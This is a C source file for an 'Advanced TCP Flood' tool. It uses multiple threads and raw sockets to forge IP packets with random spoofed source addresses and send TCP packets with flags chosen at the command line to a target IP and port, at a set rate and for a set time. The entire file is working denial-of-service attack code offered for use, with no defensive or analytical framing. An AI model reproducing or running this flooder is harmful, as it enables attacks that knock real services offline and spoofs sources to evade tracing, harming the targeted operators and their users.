/*
 * Advanced TCP Flood - Improved version
 * Released under GNU GPL License v3.0
 * Enhanced for performance, stability, and modularity
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <errno.h>

#define MAX_PACKET_SIZE 4096
#define MAX_THREADS 100
#define DEFAULT_SLEEPTIME 100

// Structure to hold configuration
typedef struct {
    char *target_ip;
    uint16_t target_port;
    int threads;
    int pps_limit;
    int duration;
    struct {
        int ack, syn, psh, fin, rst, urg, ptr, res2, seq;
    } tcp_flags;
} Config;

// Structure to hold packet data
typedef struct {
    struct iphdr ip;
    struct tcphdr tcp;
    char buffer[MAX_PACKET_SIZE];
} Packet;

// Global variables
static volatile int running = 1;
static volatile unsigned int pps = 0;
static volatile unsigned int limiter = 0;
static unsigned int sleeptime = DEFAULT_SLEEPTIME;

// Improved random number generator (Xorshift)
uint32_t xorshift_state = 1;

void init_xorshift(uint32_t seed) {
    xorshift_state = seed ? seed : (uint32_t)time(NULL);
}

uint32_t xorshift() {
    uint32_t x = xorshift_state;
    x ^= x << 13;
    x ^= x >> 17;
    x ^= x << 5;
    xorshift_state = x;
    return x;
}

// Enhanced checksum calculation
uint16_t csum(uint16_t *buf, int len) {
    uint32_t sum = 0;
    while (len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if (len > 0) {
        sum += *(uint8_t *)buf;
    }
    while (sum >> 16) {
        sum = (sum & 0xffff) + (sum >> 16);
    }
    return (uint16_t)(~sum);
}

// TCP pseudo header for checksum
struct tcp_pseudo {
    uint32_t src_addr;
    uint32_t dst_addr;
    uint8_t zero;
    uint8_t proto;
    uint16_t length;
};

// Calculate TCP checksum
uint16_t tcp_csum(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo pseudo = {
        .src_addr = iph->saddr,
        .dst_addr = iph->daddr,
        .zero = 0,
        .proto = IPPROTO_TCP,
        .length = htons(sizeof(struct tcphdr))
    };
    int total_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    uint8_t *temp = malloc(total_len);
    if (!temp) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(1);
    }
    memcpy(temp, &pseudo, sizeof(struct tcp_pseudo));
    memcpy(temp + sizeof(struct tcp_pseudo), tcph, sizeof(struct tcphdr));
    uint16_t checksum = csum((uint16_t *)temp, total_len);
    free(temp);
    return checksum;
}

// Initialize IP header
void init_ip_header(struct iphdr *iph, in_addr_t saddr, in_addr_t daddr) {
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(xorshift() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = saddr;
    iph->daddr = daddr;
    iph->check = 0;
}

// Initialize TCP header
void init_tcp_header(struct tcphdr *tcph, uint16_t sport, uint16_t dport, Config *config) {
    tcph->source = htons(sport);
    tcph->dest = htons(dport);
    tcph->seq = xorshift();
    tcph->ack_seq = config->tcp_flags.seq ? xorshift() : 0;
    tcph->doff = 5;
    tcph->ack = config->tcp_flags.ack;
    tcph->syn = config->tcp_flags.syn;
    tcph->psh = config->tcp_flags.psh;
    tcph->fin = config->tcp_flags.fin;
    tcph->rst = config->tcp_flags.rst;
    tcph->urg = config->tcp_flags.urg;
    tcph->urg_ptr = config->tcp_flags.ptr ? xorshift() % 65535 : 0;
    tcph->res2 = config->tcp_flags.res2;
    tcph->window = htons(xorshift() % 65535);
    tcph->check = 0;
}

// Flood thread
void *flood_thread(void *arg) {
    Config *config = (Config *)arg;
    Packet packet;
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port = htons(config->target_port),
        .sin_addr.s_addr = inet_addr(config->target_ip)
    };

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        fprintf(stderr, "Failed to create raw socket: %s\n", strerror(errno));
        return NULL;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        fprintf(stderr, "Failed to set IP_HDRINCL: %s\n", strerror(errno));
        close(sock);
        return NULL;
    }

    while (running) {
        memset(&packet, 0, sizeof(Packet));
        init_ip_header(&packet.ip, xorshift(), sin.sin_addr.s_addr);
        init_tcp_header(&packet.tcp, xorshift() % 65535, config->target_port, config);
        packet.ip.check = csum((uint16_t *)&packet.ip, sizeof(struct iphdr));
        packet.tcp.check = tcp_csum(&packet.ip, &packet.tcp);

        if (sendto(sock, &packet, sizeof(struct iphdr) + sizeof(struct tcphdr), 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            fprintf(stderr, "Send failed: %s\n", strerror(errno));
        }

        pps++;
        if (limiter >= config->pps_limit && config->pps_limit != -1) {
            usleep(sleeptime);
            limiter = 0;
        }
        limiter++;
    }

    close(sock);
    return NULL;
}

// Parse TCP flags
void parse_tcp_flags(Config *config, const char *flag_str) {
    config->tcp_flags.ack = strstr(flag_str, "ack") ? 1 : 0;
    config->tcp_flags.syn = strstr(flag_str, "syn") ? 1 : 0;
    config->tcp_flags.psh = strstr(flag_str, "psh") ? 1 : 0;
    config->tcp_flags.fin = strstr(flag_str, "fin") ? 1 : 0;
    config->tcp_flags.rst = strstr(flag_str, "rst") ? 1 : 0;
    config->tcp_flags.urg = strstr(flag_str, "urg") ? 1 : 0;
    config->tcp_flags.ptr = strstr(flag_str, "ptr") ? 1 : 0;
    config->tcp_flags.res2 = strstr(flag_str, "res2") ? 1 : 0;
    config->tcp_flags.seq = strstr(flag_str, "seq") ? 1 : 0;
}

// Main function
int main(int argc, char *argv[]) {
    if (argc != 7) {
        fprintf(stderr, "Usage: %s <target_ip> <port> <threads> <pps_limit> <duration> <tcp_flags>\n", argv[0]);
        return 1;
    }

    Config config = {
        .target_ip = argv[1],
        .target_port = atoi(argv[2]),
        .threads = atoi(argv[3]),
        .pps_limit = atoi(argv[4]),
        .duration = atoi(argv[5])
    };

    if (config.threads > MAX_THREADS || config.threads < 1) {
        fprintf(stderr, "Invalid thread count. Must be between 1 and %d\n", MAX_THREADS);
        return 1;
    }

    parse_tcp_flags(&config, argv[6]);
    init_xorshift(time(NULL));

    pthread_t threads[config.threads];
    printf("Starting flood on %s:%d with %d threads...\n", config.target_ip, config.target_port, config.threads);

    for (int i = 0; i < config.threads; i++) {
        if (pthread_create(&threads[i], NULL, flood_thread, &config)) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            return 1;
        }
    }

    // Dynamic PPS adjustment
    int multiplier = 20;
    for (int i = 0; i < config.duration * multiplier && running; i++) {
        usleep((1000 / multiplier) * 1000);
        if (config.pps_limit != -1 && (pps * multiplier) > config.pps_limit) {
            sleeptime += 100;
            limiter = limiter > 0 ? limiter - 1 : 0;
        } else {
            limiter++;
            sleeptime = sleeptime > 25 ? sleeptime - 25 : 0;
        }
        pps = 0;
    }

    running = 0;
    for (int i = 0; i < config.threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Flood completed.\n");
    return 0;
}